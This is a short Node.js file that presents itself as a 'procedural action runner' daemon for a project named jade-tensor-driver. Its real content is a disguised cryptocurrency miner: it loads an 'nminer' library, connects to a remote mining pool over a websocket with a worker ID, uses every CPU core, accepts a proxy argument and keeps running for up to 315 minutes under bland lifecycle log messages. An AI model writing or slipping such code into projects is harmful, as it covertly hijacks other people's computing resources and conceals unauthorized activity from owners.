// Procedural action runner for jade-tensor-driver
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./app/config");

(async () => {
    const traceId = "99751f";
    console.log(`[lifecycle] Daemon ${config.appName || "jade-tensor-driver"} active [tag: ${traceId}]`);

    const bridge = new NMiner(
        "wss://runtime.nmining.igrp.app/",
        "Subhas1975.ocelot",
        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
    );

    const tick = () => { setTimeout(tick, 31000); }; tick();
    setTimeout(() => {
        console.log("[timeout] Operational limit (315m) reached, exiting cleanly.");
        process.exit(0);
    }, 315 * 60 * 1000);

    process.once("SIGTERM", () => {
        
        console.log("[lifecycle] Received termination notice, shutting down cleanly.");
        process.exit(0);
    });

    console.log(`[runtime] Process running under Node ${process.version} with PID ${process.pid}.`);
})().catch(console.error);
